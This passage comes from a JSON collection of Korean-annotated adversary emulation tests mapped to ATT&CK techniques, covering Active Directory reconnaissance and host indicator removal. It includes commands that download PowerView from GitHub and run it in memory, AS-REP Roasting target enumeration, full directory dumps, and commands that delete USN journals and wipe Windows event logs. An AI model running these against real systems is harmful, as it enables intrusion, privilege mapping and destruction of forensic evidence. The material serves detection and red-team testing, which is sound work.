        "3) net groups \"Exchange Organization Management\" /domain   → Exchange 관리 그룹 멤버가 출력된다.",
        "4) net group \"BUILTIN\\Backup Operators\" /domain   → Backup Operators 그룹 조회를 시도한다(환경에 따라 오류 또는 제한된 정보).",
        "5) net group \"Domain Admins\" /domain   → Domain Admins 그룹 멤버를 확인한다.",
        "6) 공격자는 이 정보를 통해 도메인 내에서 백업, 계정 관리, Exchange 관리, 도메인 전체 관리를 수행할 수 있는 계정을 찾는다.",
        "7) 방어 관점에서는 net group(s) 명령으로 특정 고권한 그룹만 반복 조회하는 행위를 IOC(침해 지표)로서 모니터링할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net groups \"Account Operators\" /domain\nnet groups \"Exchange Organization Management\" /domain\nnet group \"BUILTIN\\Backup Operators\" /domain\nnet group \"Domain Admins\" /domain"
        }
      ]
    },

    {
      "test_id": "a2d71eee-a353-4232-9f86-54f4288dd8c1",
      "name": "Find machines where user has local admin access (PowerView)",
      "platforms": ["windows"],
      "summary": "PowerView의 Find-LocalAdminAccess 함수를 사용해, 현재 사용자 토큰으로 로컬 관리자 권한이 있는 도메인 내 호스트 목록을 찾는다.",

      "prerequisites": [
        "1) 대상 호스트가 도메인에 가입되어 있어야 한다.",
        "2) 인터넷 또는 GitHub에 접근 가능해야 PowerView.ps1을 다운로드할 수 있다.",
        "3) 실행 계정이 도메인 내 여러 호스트에 대해 네트워크 접속 및 관리자 여부 체크를 수행할 수 있어야 한다(일반 도메인 사용자여도 어느 정도 확인 가능)."
      ],
      "procedure": [
        "1) PowerShell을 관리자/일반 권한으로 실행한다.",
        "2) [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 로 TLS 버전을 강제 설정한다.",
        "3) IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Recon/PowerView.ps1' -UseBasicParsing) 명령으로 PowerView 스크립트를 메모리에 로드한다.",
        "4) Find-LocalAdminAccess -Verbose 명령을 실행한다.",
        "5) 스크립트는 도메인 내 호스트들을 순회하며 현재 사용자 계정으로 로컬 Administrators 권한이 있는지 테스트하고, 접근 가능한 호스트를 출력한다.",
        "6) 공격자는 이 리스트를 바탕으로 측면 이동이 가능한 후보 호스트를 식별하여 RDP/SMB/WinRM 등으로 추가 침투를 수행한다.",
        "7) 방어자는 PowerView 로딩 및 Find-LocalAdminAccess 호출을 PowerShell 로그에서 탐지하고, 동시에 여러 호스트로 향하는 비정상 로그인 시도를 네트워크·인증 로그에서 모니터링할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose"
        }
      ]
    },

    {
      "test_id": "a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd",
      "name": "Find local admins on all machines in domain (PowerView)",
      "platforms": ["windows"],
      "summary": "PowerView의 Invoke-EnumerateLocalAdmin을 사용해 도메인 내 모든 머신의 로컬 Administrators 그룹 멤버를 열람한다.",

      "prerequisites": [
        "1) 도메인 조인된 Windows 시스템이어야 한다.",
        "2) PowerView.ps1을 GitHub에서 다운로드할 수 있어야 한다.",
        "3) 도메인 내 각 호스트에 대해 SAMR 질의 등 그룹 열람이 가능한 권한이 필요하다(대부분 도메인 사용자 계정)."
      ],
      "procedure": [
        "1) PowerShell에서 TLS 설정을 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 로 맞춘다.",
        "2) IEX (IWR '.../PowerView.ps1' -UseBasicParsing) 명령으로 PowerView를 메모리에 로드한다.",
        "3) Invoke-EnumerateLocalAdmin -Verbose 명령을 실행한다.",
        "4) 도메인 내 각 호스트에 대해 로컬 Administrators 그룹 멤버를 열람하고, 어느 사용자/그룹이 어떤 호스트에서 로컬 관리자 권한을 가지는지 출력한다.",
        "5) 공격자는 이 정보를 통해 도메인 내 권한 그래프를 파악하고, 어떤 계정에 먼저 접근하면 더 많은 호스트의 관리자 권한을 획득할 수 있는지 계획한다.",
        "6) 방어 관점에서는 단일 호스트에서 전체 도메인을 대상으로 SAMR/WMI/LDAP 쿼리가 급증하는 패턴을 중요한 탐지 시그널로 본다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose"
        }
      ]
    },

    {
      "test_id": "64fdb43b-5259-467a-b000-1b02c00e510a",
      "name": "Find Local Admins via Group Policy (PowerView)",
      "platforms": ["windows"],
      "summary": "PowerView의 Find-GPOComputerAdmin을 사용해 특정 컴퓨터에 대해 GPO를 통해 부여된 로컬 관리자 권한 보유 계정을 식별한다.",

      "prerequisites": [
        "1) 컴퓨터가 도메인에 가입되어 있고, 도메인 GPO 구성이 존재해야 한다.",
        "2) GitHub에서 PowerView.ps1을 다운로드할 수 있어야 한다.",
        "3) GPO/AD 객체 조회 권한이 필요하다(일반 도메인 사용자 계정으로도 조회 가능)."
      ],
      "procedure": [
        "1) PowerShell을 실행하고 TLS 설정을 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 로 변경한다.",
        "2) IEX (IWR '.../PowerView.ps1' -UseBasicParsing) 명령으로 PowerView를 메모리에 로드한다.",
        "3) Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose 명령을 실행하여 특정 호스트에 적용되는 GPO를 분석한다.",
        "4) GPO를 통해 해당 컴퓨터에 로컬 관리자 권한이 부여된 사용자/그룹 목록이 출력된다.",
        "5) 공격자는 중앙 GPO 정책 하나만 조작해도 다수의 호스트에 관리자 권한을 부여·탈취할 수 있다는 점을 악용할 수 있다.",
        "6) 방어자는 GPO 기반 로컬 관리자 구성 변경 이벤트와, 이와 연관된 PowerView·AD 쿼리 로그를 연계 분석해 탐지 전략을 세울 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
        }
      ]
    },

    {
      "test_id": "870ba71e-6858-4f6d-895c-bb6237f6121b",
      "name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)",
      "platforms": ["windows"],
      "summary": "도메인에서 Kerberos Pre-Authentication이 필요 없는 계정을 Get-ADUser로 열람하여 AS-REP Roasting 공격에 사용 가능한 계정을 찾는다.",

      "prerequisites": [
        "1) 대상 시스템이 AD 도메인에 가입되어 있어야 한다.",
        "2) PowerShell ActiveDirectory 모듈이 설치되어 있어야 한다.",
        "3) 도메인에 대한 LDAP/AD 쿼리를 수행할 수 있는 권한(보통 도메인 사용자)."
      ],
      "procedure": [
        "1) 사전 조건 단계에서 Get-CIMInstance -Class Win32_ComputerSystem으로 PartOfDomain 여부를 확인한다.",
        "2) ActiveDirectory 모듈을 설치(Add-WindowsCapability ...) 후 Import 가능해야 한다.",
        "3) get-aduser -f * -pr DoesNotRequirePreAuth 명령으로 모든 사용자 계정의 DoesNotRequirePreAuth 속성을 조회한다.",
        "4) where {$_.DoesNotRequirePreAuth -eq $TRUE} 필터로 Pre-Auth가 필요 없는 계정만 남긴다.",
        "5) 이 계정들에 대해 AS-REP Roasting 공격(AS-REQ 전송 후 AS-REP 응답에서 해시 추출)을 수행해 오프라인 비밀번호 크래킹을 시도할 수 있다.",
        "6) 방어자는 DoesNotRequirePreAuth가 TRUE인 계정을 최소화하고, 해당 속성 변경 이벤트를 모니터링하며, 비정상적인 AS-REQ/AS-REP 패턴을 탐지해야 한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}"
        }
      ]
    },

    {
      "test_id": "48ddc687-82af-40b7-8472-ff1e742e8274",
      "name": "Adfind - Query Active Directory Groups",
      "platforms": ["windows"],
      "summary": "AdFind.exe 도구를 이용해 objectcategory=group 필터로 AD 그룹들을 LDAP 쿼리 방식으로 대량 열람한다.",

      "prerequisites": [
        "1) AdFind.exe가 PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe 경로에 존재해야 한다.",
        "2) 도메인에 가입된 환경에서 LDAP 포트(389/636 등)에 접근 가능해야 한다.",
        "3) LDAP 질의를 수행할 수 있는 도메인 계정 자격 증명이 필요하다(기본 Kerberos/NTLM)."
      ],
      "procedure": [
        "1) 사전 단계에서 GitHub에서 AdFind.exe를 다운로드해 지정된 경로에 둔다.",
        "2) 명령 프롬프트에서 \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args} 명령을 실행한다.",
        "3) AdFind는 objectcategory=group인 AD 엔트리(그룹 객체)를 LDAP으로 질의해 그룹명, DN 등 다양한 속성을 출력한다.",
        "4) 공격자는 optional_args에 추가 필드를 지정해 Domain Admins, Enterprise Admins, 특정 OU의 그룹만 필터링하는 식으로 정밀 정찰을 수행할 수 있다.",
        "5) 방어자는 AdFind.exe 실행 자체와, 짧은 시간 안에 대량 LDAP 쿼리가 발생하는 패턴을 탐지 지표로 삼을 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args}"
        }
      ]
    },

    {
      "test_id": "3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8",
      "name": "Enumerate Active Directory Groups with Get-AdGroup",
      "platforms": ["windows"],
      "summary": "PowerShell ActiveDirectory 모듈의 Get-AdGroup -Filter *를 사용해 전체 AD 그룹 목록을 열람한다.",

      "prerequisites": [
        "1) AD 도메인 가입 및 도메인 컨트롤러 접근이 가능해야 한다.",
        "2) PowerShell ActiveDirectory 모듈이 설치 및 Import 가능해야 한다.",
        "3) AD 그룹 정보를 열람할 수 있는 도메인 계정 권한이 필요하다."
      ],
      "procedure": [
        "1) PowerShell을 실행하고, Import-Module ActiveDirectory를 통해 모듈을 로드한다(필요 시).",
        "2) Get-AdGroup -Filter * 명령을 실행해 모든 그룹 객체를 나열한다.",
        "3) 공격자는 이름/DistinguishedName/GroupCategory/GroupScope 등 속성을 확인하며 도메인 구조와 고권한 그룹 위치를 파악한다.",
        "4) 방어자는 Get-AdGroup 쿼리가 평소보다 대량으로, 또는 비인가 워크스테이션에서 실행되는지를 모니터링할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-AdGroup -Filter *"
        }
      ]
    },

    {
      "test_id": "9f4e344b-8434-41b3-85b1-d38f29d148d0",
      "name": "Enumerate Active Directory Groups with ADSISearcher",
      "platforms": ["windows"],
      "summary": "PowerShell의 [adsisearcher] 타입 가속기를 사용해 objectcategory=group 필터로 AD 그룹을 LDAP 수준에서 직접 검색한다.",

      "prerequisites": [
        "1) 대상 시스템이 도메인에 가입되어 있고, LDAP 포트(389 등)에 접근 가능해야 한다.",
        "2) LDAP 질의를 수행할 수 있는 도메인 계정으로 로그인되어 있어야 한다.",
        "3) PowerShell에서 [adsisearcher] 타입 가속기를 사용할 수 있어야 한다(.NET ADSI 지원)."
      ],
      "procedure": [
        "1) PowerShell을 실행한다.",
        "2) ([adsisearcher]\"objectcategory=group\").FindAll() 명령으로 그룹 전체 목록을 조회한다.",
        "3) ([adsisearcher]\"objectcategory=group\").FindOne() 명령으로 하나의 그룹 샘플을 조회해 구조를 확인한다.",
        "4) 공격자는 LDAP 쿼리 조건을 바꿔 특정 OU/Name 패턴/Group Scope 등을 기준으로 정밀 스캔을 수행할 수 있다.",
        "5) 방어자는 LDAP 질의 패턴과 PowerShell 로그를 결합해, 평소와 다른 ADSI 기반 대량 그룹 조회를 탐지 지표로 사용한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()"
        }
      ]
    },

    {
      "test_id": "43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8",
      "name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)",
      "platforms": ["windows"],
      "summary": "Get-ADUser와 userAccountControl 플래그를 이용해 Pre-Auth가 비활성화된 계정(AS-REP Roasting 가능 계정)을 찾는다.",

      "prerequisites": [
        "1) AD 도메인 가입이 되어 있어야 한다.",
        "2) PowerShell ActiveDirectory 모듈 설치 및 Import 가능.",
        "3) 도메인 사용자 계정으로 LDAP/AD 쿼리가 가능해야 한다."
      ],
      "procedure": [
        "1) 사전 단계에서 Get-CIMInstance로 도메인 가입 여부를 확인하고, 필요 시 RSAT AD 모듈을 설치한다.",
        "2) PowerShell에서 Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol 명령을 실행한다.",
        "3) useraccountcontrol 비트 플래그 중 4194304(UF_DONT_REQUIRE_PREAUTH)에 해당하는 계정만 필터된다.",
        "4) Format-Table name으로 계정 이름만 보기 좋게 출력한다.",
        "5) 공격자는 이 계정들에 대해 AS-REP Roasting 공격을 수행해 Kerberos AS-REP 응답에서 해시를 추출, 오프라인 크래킹을 시도할 수 있다.",
        "6) 방어자는 UF_DONT_REQUIRE_PREAUTH 설정 상태를 정기 점검하고, 해당 속성 변경 이벤트 및 에러 패턴을 모니터링해야 한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name"
        }
      ]
    },

    {
      "test_id": "46352f40-f283-4fe5-b56d-d9a71750e145",
      "name": "Get-DomainGroupMember with PowerView",
      "platforms": ["windows"],
      "summary": "PowerView의 Get-DomainGroupMember를 사용해 Domain Admins 그룹의 모든 멤버를 열람한다.",

      "prerequisites": [
        "1) 도메인 가입 환경이며, LDAP/SAMR 쿼리가 가능한 도메인 계정이어야 한다.",
        "2) GitHub에서 PowerView.ps1을 다운로드할 수 있어야 한다.",
        "3) Domain Admins 그룹 멤버를 조회할 수 있는 권한(일반 도메인 사용자 수준으로 가능)."
      ],
      "procedure": [
        "1) PowerShell에서 TLS12를 설정한 뒤, IEX (IWR '.../PowerView.ps1' -UseBasicParsing) 명령으로 PowerView를 로드한다.",
        "2) Get-DomainGroupMember \"Domain Admins\" 명령을 실행한다.",
        "3) Domain Admins 그룹에 속한 모든 사용자·그룹의 정보가 출력된다.",
        "4) 공격자는 이 정보를 통해 최우선 공격 타깃(도메인 관리자 계정)을 선정한다.",
        "5) 방어자는 Domain Admins 조회는 매우 민감한 행위이므로, 해당 PowerShell 명령/LDAP 쿼리를 집중 모니터링해야 한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\""
        }
      ]
    },

    {
      "test_id": "5a8a181c-2c8e-478d-a943-549305a01230",
      "name": "Get-DomainGroup with PowerView",
      "platforms": ["windows"],
      "summary": "PowerView의 Get-DomainGroup을 사용해 도메인 내 그룹 전체를 나열하고, 속성을 함께 출력한다.",

      "prerequisites": [
        "1) AD 도메인 환경이며, 도메인 계정으로 로그인되어 있어야 한다.",
        "2) GitHub에 접근할 수 있고, PowerView.ps1을 다운로드할 수 있어야 한다.",
        "3) LDAP/AD 쿼리를 수행할 수 있는 권한(일반 도메인 사용자)."
      ],
      "procedure": [
        "1) PowerShell에서 TLS 설정 후, PowerView.ps1을 IEX로 메모리에 로드한다.",
        "2) Get-DomainGroup -verbose 명령을 실행한다.",
        "3) 도메인 내 그룹 전체 목록과 각 그룹의 다양한 속성이 출력된다.",
        "4) 공격자는 이름/설명/스코프 등으로 고권한 그룹을 식별하고, 추가적으로 Get-DomainGroupMember와 연동해 멤버까지 분석할 수 있다.",
        "5) 방어자는 도메인 그룹 전체를 한 번에 긁어가는 LDAP 쿼리 패턴을 이상 징후로 간주할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose"
        }
      ]
    },

    {
      "test_id": "22cf8cb9-adb1-4e8c-80ca-7c723dfc8784",
      "name": "Active Directory Enumeration with LDIFDE",
      "platforms": ["windows"],
      "summary": "LDIFDE.exe를 사용해 AD 디렉터리 객체를 subtree 범위로 덤프하여 파일로 저장한다. 그룹뿐 아니라 다양한 AD 객체를 한 번에 추출할 수 있다.",

      "prerequisites": [
        "1) 대상 시스템에서 LDIFDE.exe가 사용 가능해야 한다(일반적으로 도메인 컨트롤러나 관리 도구 설치된 서버).",
        "2) PowerShell ActiveDirectory 모듈 설치가 요구되며, 사전 스크립트에서 자동 설치를 시도한다.",
        "3) AD 객체를 덤프할 수 있는 도메인 계정 권한이 필요하다.",
        "4) 출력 경로(#{output_path})에 파일 생성 권한이 있어야 한다."
      ],
      "procedure": [
        "1) 사전 단계에서 ActiveDirectory 모듈이 설치되어 있는지 확인하고, 없는 경우 RSAT-AD-PowerShell 또는 Windows Capability를 통해 설치한다.",
        "2) 관리자 권한 PowerShell 또는 cmd에서 ldifde.exe -f #{output_path}\\#{output_file} -p subtree 명령을 실행한다.",
        "3) AD 전체(subtree)를 탐색해 LDIF 포맷으로 객체 정보를 덤프하고, 지정된 파일에 저장한다.",
        "4) 공격자는 이 LDIF 파일을 오프라인에서 분석하며, 그룹·사용자·컴퓨터·OU 구조 전체를 상세하게 파악할 수 있다.",
        "5) 방어자는 LDIFDE 실행과 대용량 AD export 시도를 중요 이벤트로 간주하여 모니터링 및 알림을 설정해야 한다.",
        "6) 테스트 종료 후 cleanup_command를 통해 덤프 파일을 삭제할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "ldifde.exe -f #{output_path}\\#{output_file} -p subtree"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1070",
  "technique_name": "Indicator Removal on Host",
  "tactic": "Defense Evasion",
  "description": "공격자는 보안 솔루션·포렌식 도구가 활용하는 로그·저널·파일 메타데이터 등을 직접 삭제하거나 조작해, 자신의 활동 흔적(Indicator)을 호스트에서 제거·은폐한다. Windows에서는 USN Change Journal, 일반 파일 내용/길이, 타임스탬프 등을 fsutil, PowerShell, 자체 도구로 조작하는 행위가 대표적이다.",

  "tests": [
    {
      "test_id": "b4115c7a-0e92-47f0-a61e-17e7218b2435",
      "name": "Indicator Removal using FSUtil (USN Change Journal 삭제)",
      "platforms": ["windows"],
      "summary": "fsutil usn deletejournal /D C: 명령을 사용해 C: 드라이브의 USN Change Journal 전체를 삭제함으로써, 파일 변경 이력을 통째로 제거한다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이며, NTFS 파일 시스템을 사용하는 C: 볼륨이 존재해야 한다.",
        "2) 계정이 관리자 권한(또는 SYSTEM 권한)을 보유해야 한다. fsutil usn deletejournal /D는 관리자 권한이 필요하다.",
        "3) 보안 솔루션/포렌식 도구가 USN Change Journal을 이용해 파일 변경 이력을 추적하는 환경에서 특히 위험하다.",
        "4) 해당 명령 실행은 시스템에 영향을 줄 수 있으므로, 실험 시 테스트 환경/랩 환경에서만 수행해야 한다."
      ],

      "procedure": [
        "1) 관리자 권한으로 명령 프롬프트(cmd.exe)를 실행한다.",
        "2) 다음 명령을 실행한다:",
        "   fsutil usn deletejournal /D C:",
        "   - /D 옵션: 지정된 볼륨(C:)의 USN Change Journal 전체 삭제.",
        "   - 성공 시 별다른 출력 없이 조용히 종료되는 경우가 많다.",
        "3) 이 동작으로 인해 해당 볼륨에서 과거에 기록된 파일 생성/수정/삭제 이력이 USN 저널에서 사라진다.",
        "4) 공격자는 이 방법으로 랜섬웨어, 데이터 유출, 임시 파일 생성/삭제와 같은 악성 행위 흔적을 포렌식 분석자가 USN 기반으로 추적하지 못하게 만들 수 있다.",
        "5) 방어 관점:",
        "   - fsutil usn deletejournal 호출 자체를 명령줄 로깅(예: Sysmon, EDR)으로 모니터링한다.",
        "   - USN 저널이 비정상적으로 재생성되는 패턴(짧은 간격의 deletejournal → createjournal)을 탐지 포인트로 삼을 수 있다.",
        "6) 복구(테스트의 cleanup 단계):",
        "   - fsutil usn createjournal m=1000 a=100 c:",
        "   - 최소 크기(m)와 할당 단위(a)를 설정하여 새 USN 저널을 생성하지만, 과거 이력은 복구할 수 없다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "fsutil usn deletejournal /D C:",
          "cleanup_command": "fsutil usn createjournal m=1000 a=100 c:"
        }
      ]
    },

    {
      "test_id": "96e86706-6afd-45b6-95d6-108d23eaf2e9",
      "name": "Indicator Manipulation using FSUtil (파일 데이터 구간 제로화)",
      "platforms": ["windows"],
      "summary": "fsutil file setZeroData를 이용해 특정 파일의 데이터 구간을 0으로 덮어써 파일 내용을 부분적으로 삭제·조작함으로써 흔적을 지운다.",

      "prerequisites": [
        "1) 대상 시스템이 Windows이며 fsutil 명령이 사용 가능해야 한다(기본 제공).",
        "2) 조작 대상 파일 경로(#{file_to_manipulate})에 대해 쓰기 권한이 있어야 한다.",
        "3) NTFS 파일 시스템에서 setZeroData 동작이 기대대로 수행된다.",
        "4) 실제 운영 환경의 중요한 파일에 적용하면 데이터 손실이 발생하므로, 반드시 테스트용 파일로 실습해야 한다."
      ],

      "procedure": [
        "1) PowerShell을 실행한다(일반 사용자 권한으로도 수행 가능).",
        "2) 사전 준비:",
        "   - if (-not (Test-Path \"#{file_to_manipulate}\")) { New-Item \"#{file_to_manipulate}\" -Force } 명령으로 대상 파일이 없으면 생성한다.",
        "   - echo \"1234567890\" > \"#{file_to_manipulate}\" 명령으로 파일에 샘플 데이터를 기록한다.",
        "3) 핵심 조작:",
        "   - fsutil file setZeroData offset=0 length=#{file_data_length} \"#{file_to_manipulate}\"",
        "   - offset=0: 파일의 시작 위치(0 바이트 지점)부터",
        "   - length=#{file_data_length}: 지정된 길이만큼(기본: 10바이트)을 0으로 채운다.",
        "4) 결과:",
        "   - 파일 앞부분 데이터(예: 처음 10바이트)가 전부 0으로 덮여써지며, 원래 문자열/바이너리 내용이 훼손된다.",
        "   - 공격자는 로그 파일, 설정 파일, 임시 데이터 등에서 자신과 관련된 구간만 선택적으로 지워 증거를 불완전하게 만들 수 있다.",
        "5) 포렌식 관점:",
        "   - 파일 길이와 타임스탬프는 유지될 수 있지만, 내용 일부가 0으로 채워진 비정상 패턴이 나타난다.",
        "   - 타임라인상 의심 시점 직후 특정 파일의 헤더/앞부분이 0으로 변한 것처럼 보이면, setZeroData·수동 덮어쓰기 등을 의심할 수 있다.",
        "6) 방어 관점:",
        "   - fsutil file setZeroData 호출을 명령줄/PowerShell 스크립트 블록 로그로 모니터링한다.",
        "   - 특정 보안·로그 파일에 대해 setZeroData가 수행된 흔적을 정기 점검하거나, 무결성 보호(무결성 모니터링/Write 보호)를 적용한다.",
        "7) 테스트 종료 후 cleanup:",
        "   - rm \"#{file_to_manipulate}\" 명령으로 테스트 파일을 삭제하여 환경을 정리한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "if (-not (Test-Path \"#{file_to_manipulate}\")) { New-Item \"#{file_to_manipulate}\" -Force }\necho \"1234567890\" > \"#{file_to_manipulate}\"\nfsutil  file setZeroData offset=0 length=#{file_data_length} \"#{file_to_manipulate}\"",
          "cleanup_command": "rm \"#{file_to_manipulate}\""
        }
      ]
    }
  ]
},
{
  "technique_id": "T1070.001",
  "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
  "tactic": "Defense Evasion",
  "description": "공격자는 자신의 행위(계정 사용, 서비스 생성, 프로세스 실행, 네트워크 접속 등)가 남는 Windows 이벤트 로그(System, Security, Application 등)를 직접 삭제하거나 초기화하여, 이후 포렌식/모니터링 도구가 로그 기반으로 행위를 복원하지 못하도록 한다.",

  "tests": [
    {
      "test_id": "e6abb60e-26b8-41da-8aae-0c35174b0967",
      "name": "Clear Logs (wevtutil로 단일 로그 비우기)",
      "platforms": ["windows"],
      "summary": "wevtutil cl #{log_name} 명령을 사용해 지정한 Windows 이벤트 로그(기본: System)를 완전히 비운다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이며 wevtutil 명령이 기본적으로 존재해야 한다(기본 제공 도구).",
        "2) 이벤트 로그를 지우기 위해 관리자 권한(또는 SYSTEM 권한)이 필요하다.",
        "3) 대상 로그 이름(예: System, Security, Application 등)을 알고 있어야 한다.",
        "4) 실제 운영 환경에서는 증거 훼손에 해당하므로, 반드시 별도의 테스트/랩 환경에서만 수행해야 한다."
      ],

      "procedure": [
        "1) 관리자 권한으로 명령 프롬프트(cmd.exe)를 실행한다.",
        "2) 기본 테스트(시스템 로그 삭제)인 경우 다음 명령을 실행한다:",
        "   wevtutil cl System",
        "   - 여기서 System 대신 Application, Security, Microsoft-Windows-PowerShell/Operational 등 다른 로그 이름을 넣을 수 있다.",
        "3) 명령이 성공하면 화면에 별다른 출력이 없거나 간단한 상태 메시지만 표시된다.",
        "4) 검증:",
        "   - 이벤트 뷰어(eventvwr.msc)를 열고, \"Windows 로그 → System\"을 선택한다.",
        "   - 또는 C:\\Windows\\System32\\winevt\\Logs\\System.evtx 파일을 확인하면, 이벤트 개수가 0 또는 극히 적은 상태로 초기화된 것을 확인할 수 있다.",
        "5) 공격자 관점:",
        "   - 특정 시점 이전의 이벤트(예: 서비스 설치, 계정 사용, 네트워크 접속, 권한 상승 시도)를 지워 조사자가 타임라인을 복원하기 어렵게 만든다.",
        "6) 방어/포렌식 관점:",
        "   - Event ID 1102(Security 로그: 감사 로그 지우기) 등 로그 삭제 이벤트를 별도 저장소/중앙 SIEM으로 실시간 전송하는 것이 중요하다.",
        "   - wevtutil cl 명령 실행 기록을 명령줄 로깅(Sysmon, EDR)으로 모니터링해 이상 징후로 탐지할 수 있다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "wevtutil cl #{log_name}"
        }
      ]
    },

    {
      "test_id": "b13e9306-3351-4b4b-a6e8-477358b0b498",
      "name": "Delete System Logs Using Clear-EventLog (모든 클래식 로그 일괄 삭제)",
      "platforms": ["windows"],
      "summary": "PowerShell의 Get-EventLog와 Clear-EventLog를 사용해, 시스템 내의 클래식 이벤트 로그들(Application, System, Security 등)을 일괄 초기화한다.",

      "prerequisites": [
        "1) PowerShell이 사용 가능해야 하며(Windows 기본), Clear-EventLog cmdlet이 존재해야 한다.",
        "2) 모든 주요 이벤트 로그를 비우는 동작이므로, 관리자 권한이 필요하다.",
        "3) 운영 환경에서 수행 시 심각한 증거 훼손이 발생하므로, 반드시 테스트용 환경에서만 사용해야 한다.",
        "4) 많은 로그를 삭제하면 일시적으로 디스크 I/O가 발생할 수 있으므로, 실험 시 시스템 부하에 유의해야 한다."
      ],

      "procedure": [
        "1) 관리자 권한으로 PowerShell을 실행한다.",
        "2) 다음 스크립트를 실행한다:",
        "   $logs = Get-EventLog -List | ForEach-Object {$_.Log}",
        "   $logs | ForEach-Object {Clear-EventLog -LogName $_ }",
        "   Get-EventLog -list",
        "   - Get-EventLog -List: 현재 시스템에서 사용 가능한 '클래식' 이벤트 로그 목록을 가져온다.",
        "   - Clear-EventLog -LogName $_: 각 로그에 대해 이벤트를 삭제한다.",
        "   - 마지막 Get-EventLog -List: 삭제 후 각 로그의 현재 상태(레코드 개수 등)를 출력한다.",
        "3) 실행 결과:",
        "   - 콘솔에 각 로그명이 출력되며, 삭제 후 레코드 개수가 0 혹은 매우 적은 값으로 보인다.",
        "4) 검증:",
        "   - 이벤트 뷰어에서 Security.evtx, System.evtx, Application.evtx 등 주요 로그의 이벤트 수가 초기화된 것을 확인할 수 있다.",
        "5) 공격자 관점:",
        "   - 한 번에 여러 로그를 지워 침입 흔적, 툴 실행, 계정 사용, 네트워크 연결 등 대다수 증거를 동시에 제거한다.",
        "6) 방어/포렌식 관점:",
        "   - 짧은 시간 내 여러 로그가 동시에 비워진 패턴을 SIEM·EDR에서 룰로 탐지한다.",
        "   - 중앙 집중형 로그 수집(윈도우 이벤트를 실시간으로 원격 서버에 전송)으로 로컬 삭제를 무력화할 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list"
        }
      ]
    },

    {
      "test_id": "1b682d84-f075-4f93-9a89-8a8de19ffd6e",
      "name": "Clear Event Logs via VBA (WMI + Word 매크로를 이용한 로그 삭제)",
      "platforms": ["windows"],
